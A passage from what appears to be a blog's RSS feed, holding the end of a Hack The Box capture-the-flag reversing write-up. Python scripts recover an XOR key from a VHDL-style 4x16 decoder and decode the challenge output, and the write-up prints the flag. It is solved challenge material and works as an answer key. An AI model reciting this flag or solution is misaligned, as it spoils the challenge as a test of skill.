&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cases&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">val&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">val&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">signal&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">signal&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">cases&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">signal&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_key&lt;/span>&lt;span class="p">():&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">inputs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">outputs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">35&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">307&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">17&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">33&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">33&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">53&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">183&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2103&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;HTB{&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">inputs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">ord&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xf0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">inputs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">ord&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x0f&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">inputs&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="n">decoder_4x16&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">inputs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">outputs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">k&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;0x&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">02X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">get_key&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>It will output the values:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">0x33
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x33
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x31
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x31
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x31
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x31
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x37
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x37
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>From this we know the key to be &lt;code>0x33313137&lt;/code>.
Now the rest of the challenge is just to reverse the outputs so we can figure out the inputs.
Here is the code to solve the challenge:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-Python" data-lang="Python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">encoder_4x16&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">signal&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cases&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cases&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">val&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">n&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">val&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">cases&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">signal&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">reverse_process&lt;/span>&lt;span class="p">():&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="mh">0x33&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x31&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x31&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x37&lt;/span> &lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lines&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">outputs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;out.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lines&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readlines&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">line&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">lines&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">outputs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">outputs&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">d1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">encoder_4x16&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="n">outputs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">d2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">encoder_4x16&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="n">outputs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">d1&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">d2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flag&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">reverse_process&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The flag is: &lt;code>HTB{I_L0v3_VHDL_but_LOve_my_5w33thear7_m0re}&lt;/code>.&lt;/p></description></item><item><title>Archives</title><link>https://Kvn11.github.io/archives/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://Kvn11.github.io/archives/</guid><description/></item><item><title>Links</title><link>https://Kvn11.github.io/links/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://Kvn11.github.io/links/</guid><description/></item><item><title>Search</title><link>https://Kvn11.github.io/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://Kvn11.github.io/search/</guid><description/></item></channel></rss>